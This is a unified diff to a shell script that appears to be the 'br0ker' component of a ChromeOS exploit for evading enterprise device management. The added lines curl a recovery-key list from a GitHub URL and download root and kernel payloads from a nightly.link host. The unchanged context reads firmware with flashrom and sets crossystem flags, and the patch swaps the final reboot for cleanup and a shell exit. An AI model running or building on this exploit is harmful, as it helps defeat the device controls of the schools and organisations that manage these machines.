@@ -11,7 +11,6 @@ set -eE
 SCRIPT_DATE="[2025-08-03]"
 PAYLOAD_DIR=/br0ker
 RECOVERY_KEY_LIST="$SCRIPT_DIR"/short_recovery_keys.txt
-kernroothost="https://nightly.link/crosbreaker/sh1mmer/actions/runs/17084932935/$BOARD"
 MNT=
 TMPFILE=
 
@@ -105,6 +104,7 @@ if [ -f /etc/lsb-release ]; then
 	BOARD="${BOARD#*=}"
 	BOARD="${BOARD%-signed-*}"
 else
+    curl -LO https://raw.githubusercontent.com/MercuryWorkshop/sh1mmer/beautifulworld/wax/payloads/short_recovery_keys.txt
 	[ -f "$RECOVERY_KEY_LIST" ] || fail "Missing recovery key list!"
 	TMPFILE=$(mktemp)
 	flashrom -i GBB -r "$TMPFILE" >/dev/null 2>&1
@@ -155,8 +155,6 @@ echo "- Changing the device's serial number"
 echo "- Changing the device's secret"
 echo "- Other temporary bypasses, check the \"Avoiding accidental re-enrollment\" thread in TN for more info."
 echo "Note that this exploit is expected to be fully patched soon."
-mkdir /br0ker
-cd /br0ker
 MNT=$(mktemp -d)
 USE_KERN=
 
@@ -176,7 +174,10 @@ done
 
 if [ -z "$USE_KERN" ]; then
     directory="/br0ker"
+	kernroothost="https://nightly.link/crosbreaker/sh1mmer/actions/runs/18078469427/$BOARD"
+	echo "Debug: $kernroothost"
 	echo "Starting br0ker payload download ($BOARD)"
+	mkdir "$directory"
  	cd "$directory"
 	echo "Downloading root. THIS WILL TAKE TIME!  THIS IS LIKELY NOT FROZEN"
 	curl --progress-bar -LO ""$kernroothost"_root.gz.zip" || fail "root.gz failed to download"
@@ -239,7 +240,7 @@ crossystem disable_dev_request=1 || :
 crossystem disable_dev_request=1 # grunt weirdness
 crossystem block_devmode=1 || :
 crossystem block_devmode=1
-
-echo "Finished! rebooting."
-reboot -f
-sleep infinity
+echo "Cleaning up payload dir..."
+rm -rf /br0ker
+echo "Finished! dropping shell"
+exit
